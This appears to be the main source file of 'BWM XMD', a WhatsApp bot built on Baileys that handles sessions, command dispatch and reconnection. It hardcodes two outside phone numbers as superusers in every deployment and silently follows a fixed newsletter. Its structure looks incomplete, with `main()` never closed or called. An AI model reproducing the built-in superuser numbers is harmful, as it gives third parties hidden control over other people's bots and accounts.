
/*/▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱//
______     __     __     __    __        __  __     __    __     _____    
/\  == \   /\ \  _ \ \   /\ "-./  \      /\_\_\_\   /\ "-./  \   /\  __-.  
\ \  __<   \ \ \/ ".\ \  \ \ \-./\ \     \/_/\_\/_  \ \ \-./\ \  \ \ \/\ \ 
 \ \_____\  \ \__/".~\_\  \ \_\ \ \_\      /\_\/\_\  \ \_\ \ \_\  \ \____- 
  \/_____/   \/_/   \/_/   \/_/  \/_/      \/_/\/_/   \/_/  \/_/   \/____/ 
                                                                           
/▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰/*/
    



                   
const { default: makeWASocket, isJidGroup, downloadAndSaveMediaMessage, superUser, imageMessage, CommandSystem, repondre,  verifierEtatJid, recupererActionJid, DisconnectReason, getMessageText, commandRegistry, delay, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, jidDecode, proto, getContentType } = require("@whiskeysockets/baileys");
const SUDO_NUMBERS = ["254727716045","254710772666"].map(num => num + "@s.whatsapp.net");
const logger = require("@whiskeysockets/baileys/lib/Utils/logger").default.child({});
const { createContext } = require("./utils/helper");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const conf = require("./config");
const axios = require("axios");
const moment = require("moment-timezone");
const fs = require("fs-extra");
const path = require("path");
const FileType = require("file-type");
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const { getSettings } = require("./utils/settings");
const evt = require("./Ibrahim/adams");
const rateLimit = new Map();
const chalk = require("chalk");
const express = require("express");
const { exec } = require("child_process");
const http = require("http");
const zlib = require('zlib');
const PREFIX = conf.PREFIX;
const more = String.fromCharCode(8206);
const herokuAppName = process.env.HEROKU_APP_NAME || "Unknown App Name";
const herokuAppLink = process.env.HEROKU_APP_LINK || `https://dashboard.heroku.com/apps/${herokuAppName}`;
const botOwner = process.env.NUMERO_OWNER || "Unknown Owner";
const PORT = process.env.PORT || 3000;
const app = express();
let adams;
require("dotenv").config({ path: "./config.env" });
logger.level = "silent";
app.use(express.static("public"));
app.get("/", (req, res) => res.sendFile(__dirname + "/index.html"));
app.listen(PORT, () => console.log(`Bwm xmd is starting with a speed of ${PORT}ms🚀`));


//============================================================================//


function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Your verified by Sir Ibrahim Adams', jid);
        return false;
    }
    console.log('Welcome to bwm xmd', jid);
    return true;
}

async function authentification() {
    try {
        if (!fs.existsSync(__dirname + "/Session/creds.json")) {
            console.log("Bwm xmd session connected ✅");
            // Split the session strihhhhng into header and Base64 data
            const [header, b64data] = conf.session.split(';;;'); 

            // Validate the session format
            if (header === "BWM-XMD" && b64data) {
                let compressedData = Buffer.from(b64data.replace('...', ''), 'base64'); // Decode and truncate
                let decompressedData = zlib.gunzipSync(compressedData); // Decompress session
                fs.writeFileSync(__dirname + "/Session/creds.json", decompressedData, "utf8"); // Save to file
            } else {
                throw new Error("Invalid session format");
            }
        } else if (fs.existsSync(__dirname + "/Session/creds.json") && conf.session !== "zokk") {
            console.log("Updating existing session...");
            const [header, b64data] = conf.session.split(';;;'); 

            if (header === "BWM-XMD" && b64data) {
                let compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
                let decompressedData = zlib.gunzipSync(compressedData);
                fs.writeFileSync(__dirname + "/Session/creds.json", decompressedData, "utf8");
            } else {
                throw new Error("Invalid session format");
            }
        }
    } catch (e) {
        console.log("Session Invalid: " + e.message);
        return;
    }
}
module.exports = { authentification };
authentification();
let zk;

//===============================================================================//

const store = makeInMemoryStore({
    logger: pino().child({ level: "silent", stream: "store" })
});

async function main() {
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + "/Session");
    
    const sockOptions = {
        version,
        logger: pino({ level: "silent" }),
        browser: ['BWM XMD', "safari", "1.0.0"],
        printQRInTerminal: true,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger)
        },
        getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg.message || undefined;
            }
            return { conversation: 'Error occurred' };
        }
    };

    adams = makeWASocket(sockOptions);
    store.bind(adams.ev);

    // Silent Rate Limiting
    function isRateLimited(jid) {
        const now = Date.now();
        if (!rateLimit.has(jid)) {
            rateLimit.set(jid, now);
            return false;
        }
        const lastRequestTime = rateLimit.get(jid);
        if (now - lastRequestTime < 3000) return true;
        rateLimit.set(jid, now);
        return false;
    }

    // Group Metadata Handling
    const groupMetadataCache = new Map();
    async function getGroupMetadata(groupId) {
        if (groupMetadataCache.has(groupId)) {
            return groupMetadataCache.get(groupId);
        }
        try {
            const metadata = await zk.groupMetadata(groupId);
            groupMetadataCache.set(groupId, metadata);
            setTimeout(() => groupMetadataCache.delete(groupId), 60000);
            return metadata;
        } catch (error) {
            if (error.message.includes("rate-overlimit")) {
                await new Promise(res => setTimeout(res, 5000));
            }
            return null;
        }
    }

/* //============================================================================//
 
adams.ev.on("messages.upsert", async (m) => {
    try {
        const { messages } = m;
        if (!messages || messages.length === 0) return;
        
        const ms = messages[0];
        if (!ms.message) return;

        // Decode JID
        const decodeJid = (jid) => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return decode.user && decode.server ? decode.user + '@' + decode.server : jid;
            }
            return jid;
        };

        // Get message type and extract text
        var mtype = ms.message ? getContentType(ms.message) : "";
        var texte = mtype === "conversation" ? ms.message.conversation :
            mtype === "imageMessage" ? ms.message.imageMessage?.caption :
            mtype === "videoMessage" ? ms.message.videoMessage?.caption :
            mtype === "extendedTextMessage" ? ms.message?.extendedTextMessage?.text :
            mtype === "buttonsResponseMessage" ? ms?.message?.buttonsResponseMessage?.selectedButtonId :
            mtype === "listResponseMessage" ? ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
            mtype === "messageContextInfo" ?
                (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";

        // Extract message metadata
        var origineMessage = ms.key.remoteJid;
        var idBot = decodeJid(adams.user.id);
        var servBot = idBot.split('@')[0];
        var verifGroupe = origineMessage?.endsWith("@g.us");
        var infosGroupe = verifGroupe ? await adams.groupMetadata(origineMessage) : "";
        var nomGroupe = verifGroupe ? infosGroupe.subject : "";
        var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
        var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
        var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
        var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;

        if (ms.key.fromMe) auteurMessage = idBot;
        var membreGroupe = verifGroupe ? ms.key.participant : '';

        // Define Owner and Sudo Users
        const BOT_OWNER = conf.OWNER_NUMBER;
        const SUDO_NUMBERS = ["254727716045", "254710772666"]
            .map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");

        const superUserNumbers = [servBot, BOT_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
        const allAllowedNumbers = superUserNumbers.concat(SUDO_NUMBERS);
        const superUser = allAllowedNumbers.includes(auteurMessage);

        // Function to Send a Response
        function repondre(mes) {
            try {
                if (adams) {
                    adams.sendMessage(origineMessage, { text: mes }, { quoted: ms })
                        .catch(() => {}); // Prevent errors from stopping execution
                }
            } catch (err) {}
        }

        // Function to Get Group Admins
        function groupeAdmin(membreGroupe) {
            return membreGroupe ? membreGroupe.filter((m) => m.admin).map((m) => m.id) : [];
        }
               
        // Define command options
        var commandeOptions = {
            superUser,
            verifGroupe,
            membreGroupe,
            infosGroupe,
            nomGroupe,
            imageMessage,
            auteurMessage,
            idBot,
            PREFIX: conf.PREFIX,
            repondre,
            sendMessage,
            mtype,
            groupeAdmin,
            msgRepondu,
            auteurMsgRepondu,
            ms
        };

    } catch (error) {
        // Handle errors without crashing
    }
});
*/
 //============================================================================//
            
                         
// Listener Manager Class
class ListenerManager {
    constructor() {
        this.activeListeners = new Map();
    }

    async loadListeners(adams, store, commands) {
        const listenerDir = path.join(__dirname, 'bwmxmd');
        
        // Clear existing listeners first
        this.cleanupListeners();
        
        // Load new listeners
        const files = fs.readdirSync(listenerDir).filter(f => f.endsWith('.js'));
        
        for (const file of files) {
            try {
                const listenerPath = path.join(listenerDir, file);
                const { setup } = require(listenerPath);
                
                if (typeof setup === 'function') {
                    const cleanup = await setup(adams, { 
                        store,
                        commands,
                        logger,
                        config: conf
                    });
                    
                    this.activeListeners.set(file, cleanup);
                    console.log(`Loaded listener: ${file}`);
                }
            } catch (e) {
                console.error(`Error loading listener ${file}: ${e.message}`);
            }
        }
    }

    cleanupListeners() {
        for (const [name, cleanup] of this.activeListeners) {
            try {
                if (typeof cleanup === 'function') cleanup();
            } catch (e) {
                console.error(`Error cleaning up listener ${name}: ${e.message}`);
            }
        }
        this.activeListeners.clear();
    }
}

// Initialize listener manager
const listenerManager = new ListenerManager();

// Add to connection handler
adams.ev.on('connection.update', ({ connection }) => {
    if (connection === 'open') {
        // Load listeners when connected
        listenerManager.loadListeners(adams, store, commandRegistry)
            .then(() => console.log('All listeners initialized'))
            .catch(console.error);
    }
    
    if (connection === 'close') {
        // Cleanup listeners on disconnect
        listenerManager.cleanupListeners();
    }
});

// Optional: Hot reload listeners when files change
fs.watch(path.join(__dirname, 'bwmxmd'), (eventType, filename) => {
    if (eventType === 'change' && filename.endsWith('.js')) {
        console.log(`Reloading listener: ${filename}`);
        delete require.cache[require.resolve(path.join(__dirname, 'bwmxmd', filename))];
        listenerManager.loadListeners(adams, store, commandRegistry);
    }
});


 

 //============================================================================================================

console.log("Loading Bwm xmd Commands...\n");

// Load commands from Taskflow folder
try {
    const taskflowPath = path.join(__dirname, "Taskflow");
    fs.readdirSync(taskflowPath).forEach((fichier) => {
        if (path.extname(fichier).toLowerCase() === ".js") {
            try {
                require(path.join(taskflowPath, fichier));
                console.log(`✔️ ${fichier} installed successfully.`);
            } catch (e) {
                console.error(`❌ Failed to load ${fichier}: ${e.message}`);
            }
        }
    });
} catch (error) {
    console.error("❌ Error reading Taskflow folder:", error.message);
}

 //============================================================================//

const STATE = conf.PRESENCE; 
adams.ev.on('messages.upsert', async ({ messages, type }) => {
    try {
        // Validate message type
        if (type !== 'notify') return;
        
        const ms = messages[0];
        if (!ms?.message || !ms?.key) return;

        // Improved JID handling
        const decodeJid = (jid) => {
            if (!jid) return '';
            if (typeof jid === 'string') return jid;
            return jid.decodeJid?.() || jid.user || '';
        };

        // Core message info
        const origineMessage = ms.key.remoteJid || '';
        const idBot = decodeJid(adams.user?.id);
        const botJid = idBot.includes('@') ? idBot : `${idBot}@s.whatsapp.net`;
        const verifGroupe = origineMessage.endsWith('@g.us');
        
        // Group metadata handling
        let infosGroupe = null;
        let nomGroupe = '';
        if (verifGroupe) {
            try {
                infosGroupe = await adams.groupMetadata(origineMessage);
                nomGroupe = infosGroupe?.subject || '';
            } catch (err) {
                console.error('Group metadata error:', err);
            }
        }

        // Quoted message handling
        const quotedMsg = ms.message?.extendedTextMessage?.contextInfo;
        const msgRepondu = quotedMsg?.quotedMessage || null;
        const auteurMsgRepondu = decodeJid(quotedMsg?.participant);
        const mentionedJids = quotedMsg?.mentionedJid || [];

        // Author determination
        let auteurMessage = verifGroupe 
            ? decodeJid(ms.key.participant || ms.participant) || origineMessage
            : origineMessage;
        if (ms.key.fromMe) auteurMessage = botJid;

        // Permission system
        const superUser = [
            `${conf.OWNER_NUMBER}@s.whatsapp.net`,
            botJid,
            ...(SUDO_NUMBERS || [])
        ].includes(auteurMessage);

        let verifAdmin = false;
        let botIsAdmin = false;
        if (verifGroupe && infosGroupe?.participants) {
            const admins = infosGroupe.participants
                .filter(p => p?.admin)
                .map(p => decodeJid(p.id));
            verifAdmin = admins.includes(auteurMessage);
            botIsAdmin = admins.includes(botJid);
        }

        // Message content extraction (fixed regex)
        const messageType = Object.keys(ms.message)[0];
        const texte = ms.message.conversation || 
                     ms.message.extendedTextMessage?.text || 
                     ms.message[messageType]?.caption || '';

        // Fixed command parsing (regex fix)
        if (typeof texte === 'string' && texte.startsWith(PREFIX)) {
            const args = texte.slice(PREFIX.length).trim().split(/\s+/);
            const com = args[0]?.toLowerCase();
            if (!com) return;

            const cmd = Array.isArray(evt.cm) 
                ? evt.cm.find(c => c?.nomCom === com || c?.aliases?.includes(com))
                : null;
            if (!cmd) return;

            try {
                // Permission check
                if (!superUser && conf.MODE?.toLowerCase() !== "yes") {
                    console.log(`Command blocked: ${auteurMessage}`);
                    return;
                }

                // Enhanced reply function
                const repondre = async (text, options = {}) => {
                    try {
                        await adams.sendMessage(origineMessage, {
                            text: String(text),
                            ...createContext(auteurMessage, {
                                title: options.title || nomGroupe || "BWM-XMD",
                                body: options.body || "",
                                thumbnail: options.thumbnail
                            })
                        }, { quoted: ms });
                    } catch (err) {
                        console.error('Reply failed:', err);
                    }
                };

                // Add reaction
                if (cmd.reaction) {
                    try {
                        await adams.sendMessage(origineMessage, {
                            react: {
                                key: ms.key,
                                text: cmd.reaction
                            }
                        });
                    } catch (err) {
                        console.error('Reaction failed:', err);
                    }
                }

                // Execute command with full context
                await cmd.fonction(origineMessage, adams, {
                    ms,
                    arg: args.slice(1),
                    repondre,
                    superUser,
                    verifAdmin,
                    botIsAdmin,
                    verifGroupe,
                    infosGroupe,
                    nomGroupe,
                    auteurMessage,
                    utilisateur: mentionedJids[0] || auteurMsgRepondu || '',
                    membreGroupe: verifGroupe ? decodeJid(ms.key.participant) : '',
                    origineMessage,
                    msgRepondu,
                    auteurMsgRepondu
                });

            } catch (error) {
                console.error(`Command [${com}] error:`, error);
                try {
                    await adams.sendMessage(origineMessage, {
                        text: `🚨 Error: ${error.message}`,
                        ...createContext(auteurMessage, {
                            title: "Command Failed",
                            body: "Please try again"
                        })
                    }, { quoted: ms });
                } catch (sendErr) {
                    console.error('Error feedback failed:', sendErr);
                }
            }
        }
    } catch (globalErr) {
        console.error('Global message handler error:', globalErr);
    }
});

// Additional required functions for Baileys v5+
function getMessageType(message) {
    if (!message) return null;
    const type = Object.keys(message)[0];
    return type === 'conversation' ? 'text' : type;
}

function getMessageContent(message) {
    const type = getMessageType(message);
    if (!type) return null;
    
    switch(type) {
        case 'text':
        case 'conversation':
            return message.conversation;
        case 'extendedTextMessage':
            return message.extendedTextMessage.text;
        case 'imageMessage':
        case 'videoMessage':
        case 'documentMessage':
            return message[type]?.caption || '';
        default:
            return null;
    }
} 
//===============================================================================================================
 // Single connection.update handler to avoid conflicts
adams.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    const statusMessages = {
        connecting: "🔄 Connecting to WhatsApp...",
        open: "✅ Successfully connected",
        close: "❌ Connection closed",
        connecting: "🔄 Reconnecting..."
    };

    // Log connection status
    if (statusMessages[connection]) {
        console.log(statusMessages[connection]);
    }

    // Handle successful connection
    if (connection === "open") {
        console.log("🌎 BWM XMD ONLINE 🌎");
        
        try {
            // Send connection message if enabled
            if (conf.DP?.toLowerCase() === "yes") {
                const md = conf.MODE?.toLowerCase() === "yes" ? "public" : "private";
                const connectionMsg = `
〔  🚀 BWM XMD CONNECTED 🚀 〕

├──〔 ✨ Version: 7.0.8 〕 
├──〔 🎭 Mode: ${md} 〕 
│ ✅ Prefix: [ ${conf.PREFIX} ]  
│  
├──〔 📦 Deployment 〕 
╰──────────────────◆`;

                await adams.sendMessage(
                    adams.user.id,
                    { 
                        text: connectionMsg,
                        ...createContext(adams.user.id, {
                            title: "System Notification",
                            body: "Connection established"
                        })
                    }
                ).catch(err => console.error("Status message error:", err));
            }

            // Newsletter handling with existence check
            const newsletterJid = "120363285388090068@newsletter";
            try {
                const [newsletter] = await adams.onWhatsApp(newsletterJid);
                if (newsletter?.exists) {
                    await adams.newsletterFollow(newsletterJid);
                }
            } catch (newsletterErr) {
                console.error("Newsletter error:", newsletterErr);
            }
        } catch (err) {
            console.error("Connection open handler error:", err);
        }
    }

    // Handle disconnection
    if (connection === "close") {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== 401; // 401 means logged out
        console.log(`Connection closed, ${shouldReconnect ? "reconnecting..." : "not reconnecting"}`);
        
        if (shouldReconnect) {
            setTimeout(() => {
                main().catch(err => console.log("Reconnection error:", err));
            }, 5000); // 5 second delay before reconnecting
        }
    }
});

// Credentials update handler
adams.ev.on("creds.update", saveCreds);
